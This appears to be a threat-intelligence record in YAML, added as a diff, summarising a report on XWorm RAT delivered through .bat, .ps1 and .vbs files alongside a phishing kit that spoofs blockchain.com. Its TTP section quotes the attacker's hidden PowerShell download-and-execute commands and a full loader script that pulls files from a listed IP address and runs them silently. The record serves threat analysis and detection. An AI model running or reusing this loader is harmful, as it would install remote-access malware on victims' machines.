@@ -1,0 +1,48 @@
+title: 'The Accidental Malware Repository: Hunting & Collecting Malware Via Open Directories
+  (Part 1)'
+description: A threat actor hosted XWorm RAT alongside a blockchain phishing kit on
+  an open directory server, using a chain of .bat, .ps1, and .vbs files to download
+  and execute the RAT payload while spoofing login.blockchain.com to steal credentials
+  and private key recovery phrases.
+attribution: ''
+malware_families:
+- XWorm RAT
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - wscript.exe
+  command_lines:
+  - powershell -WindowStyle Hidden -Command "& { (New-Object System.Net.WebClient).DownloadFile('%Url%', '%Destination') }"
+  - powershell -WindowStyle Hidden -File %Destination%
+  powershell:
+  - "$Url1 = \"http://65.1.224.214/2.bat\"\n$Destination1 = Join-Path $env:TEMP '2.bat'\n\
+    (New-Object System.Net.WebClient).DownloadFile($Url1, $Destination1)\n$Url2 =\
+    \ \"http://65.1.224.214/start.vbs\"\n$Destination2 = Join-Path $env:TEMP 'start.vbs'\n\
+    (New-Object System.Net.WebClient).DownloadFile($Url2, $Destination2)\nif (-not\
+    \ (Test-Path $Destination1) -or -not (Test-Path $Destination2)) {\n    Write-Host\
+    \ \"Files not downloaded successfully.\"\n} else {\n    Write-Host \"Files downloaded\
+    \ successfully.\"\n    Start-Sleep -Seconds 5\n    Start-Process wscript.exe -ArgumentList\
+    \ $Destination2 -WindowStyle Hidden\n}"
+  scripts:
+  - Downloader.bat
+  - PowerShell.ps1
+  - start.vbs
+  - 2.bat
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - Downloader.bat -> 65.1.224[.]214:80
+  - PowerShell.ps1 -> 65.1.224[.]214:80
+  file_activity: []
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains: []
+  urls: []
+authors: []
+reference: https://hunt.io/blog/hunting-and-collecting-malware-via-open-directories-part-1
+date_of_publication: February 01, 2024
+file_creation_date: May 26, 2026
